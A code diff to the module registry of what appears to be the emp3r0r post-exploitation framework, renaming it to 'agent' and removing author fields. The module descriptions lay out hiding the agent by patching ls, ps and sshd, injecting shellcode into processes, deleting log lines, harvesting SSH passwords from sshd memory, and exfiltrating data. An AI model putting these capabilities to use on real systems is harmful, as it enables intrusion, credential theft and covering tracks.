@@ -27,12 +27,12 @@ const (
 var PersistMethods = map[string]string{
 	"profiles": "Add some aliases to shell profiles, will trigger when user logs in",
 	"cron":     "Add a cronjob",
-	"patcher":  "Patch binaries (ls, ps, pstree, sshd, bash, sh...) so they load loader.so on startup, it also make emp3r0r essentially invisible to those tools",
+	"patcher":  "Patch binaries (ls, ps, pstree, sshd, bash, sh...) so they load loader.so on startup, it also make agent essentially invisible to those tools",
 }
 
 var InjectorMethods = map[string]string{
-	"shellcode":      "Inject shellcode (see wiki), if no shellcode is specified, it will inject guardian.asm (runs emp3r0r as child process)",
-	"shared_library": "Inject a shared library, if no library is specified, it will inject loader.so (ELF loader that runs emp3r0r agent)",
+	"shellcode":      "Inject shellcode (see wiki), if no shellcode is specified, it will inject guardian.asm (runs agent as child process)",
+	"shared_library": "Inject a shared library, if no library is specified, it will inject loader.so (ELF loader that runs agent agent)",
 }
 
 // ModOption represents module options
@@ -75,7 +75,6 @@ var Modules = map[string]*ModuleConfig{
 	ModVACCINE: {
 		Name:     ModVACCINE,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Install tools to RuntimeConfig.UtilsPath, for lateral movement",
 		IsLocal:  false,
@@ -100,7 +99,6 @@ var Modules = map[string]*ModuleConfig{
 	ModCMD_EXEC: {
 		Name:     ModCMD_EXEC,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Run a single command on one or more targets",
 		IsLocal:  false,
@@ -130,7 +128,6 @@ var Modules = map[string]*ModuleConfig{
 	ModCLEAN_LOG: {
 		Name:     ModCLEAN_LOG,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Delete lines containing keyword from xtmp logs",
 		IsLocal:  false,
@@ -156,7 +153,6 @@ var Modules = map[string]*ModuleConfig{
 	ModLPE_SUGGEST: {
 		Name:     ModLPE_SUGGEST,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Run linux-smart-enumeration or linux exploit suggester",
 		IsLocal:  false,
@@ -182,7 +178,6 @@ var Modules = map[string]*ModuleConfig{
 	// ModPERSISTENCE: { // DISABLED: buggy module
 	// 	Name:     ModPERSISTENCE,
 	// 	Build:    "",
-	// 	Author:   "jm33-ng",
 	// 	Date:     "2020-01-25",
 	// 	Comment:  "Get persistence via built-in methods",
 	// 	IsLocal:  false,
@@ -207,7 +202,6 @@ var Modules = map[string]*ModuleConfig{
 	ModELF_PATCH: {
 		Name:     ModELF_PATCH,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2024-12-19",
 		Comment:  "Patch an ELF binary to load a specified shared library on startup",
 		IsLocal:  false,
@@ -242,7 +236,6 @@ var Modules = map[string]*ModuleConfig{
 	ModPROXY: {
 		Name:     ModPROXY,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Start a socks proxy on target host",
 		IsLocal:  false,
@@ -280,7 +273,6 @@ var Modules = map[string]*ModuleConfig{
 	ModPORT_FWD: {
 		Name:     ModPORT_FWD,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Port mapping from agent to CC",
 		IsLocal:  false,
@@ -328,7 +320,6 @@ var Modules = map[string]*ModuleConfig{
 	ModSHELL: {
 		Name:     ModSHELL,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Bring your own shell program to run on target",
 		IsLocal:  false,
@@ -367,7 +358,6 @@ var Modules = map[string]*ModuleConfig{
 	ModINJECTOR: {
 		Name:     ModINJECTOR,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Inject shellcode/loader.so into a running process",
 		IsLocal:  false,
@@ -399,7 +389,6 @@ var Modules = map[string]*ModuleConfig{
 	ModBring2CC: {
 		Name:     ModBring2CC,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Bring arbitrary agent to CC",
 		IsLocal:  false,
@@ -431,7 +420,6 @@ var Modules = map[string]*ModuleConfig{
 	ModListener: {
 		Name:     ModListener,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Start a listener to serve stagers or regular files",
 		IsLocal:  false,
@@ -475,7 +463,6 @@ var Modules = map[string]*ModuleConfig{
 	ModSSHHarvester: {
 		Name:     ModSSHHarvester,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Harvest clear-text password automatically from OpenSSH server process",
 		IsLocal:  false,
@@ -485,7 +472,7 @@ var Modules = map[string]*ModuleConfig{
 		Options: ModOptions{
 			"code_pattern": &ModOption{
 				Name: "code_pattern",
-				Desc: "Code pattern to set breakpoint, big-endian. emp3r0r will stop there and dump password, and check RAX to make sure password is valid",
+				Desc: "Code pattern to set breakpoint, big-endian. agent will stop there and dump password, and check RAX to make sure password is valid",
 				Val:  "4883c4080fb6c021",
 			},
 			"reg_name": &ModOption{
@@ -512,7 +499,6 @@ var Modules = map[string]*ModuleConfig{
 	ModFileServer: {
 		Name:     ModFileServer,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Start a secure file server on target host for data exfiltration and module file caching",
 		IsLocal:  false,
@@ -542,7 +528,6 @@ var Modules = map[string]*ModuleConfig{
 	ModDownloader: {
 		Name:     ModDownloader,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Download and decrypt a file from other agents, run `file_server` first",
 		IsLocal:  false,
@@ -577,7 +562,6 @@ var Modules = map[string]*ModuleConfig{
 	ModMemDump: {
 		Name:     ModMemDump,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Dump memory regions of a process",
 		IsLocal:  false,
@@ -602,7 +586,6 @@ var Modules = map[string]*ModuleConfig{
 	ModSCREENSHOT: {
 		Name:     ModSCREENSHOT,
 		Build:    "",
-		Author:   "jm33-ng",
 		Date:     "2020-01-25",
 		Comment:  "Take a screenshot of the agent's screen",
 		IsLocal:  false,
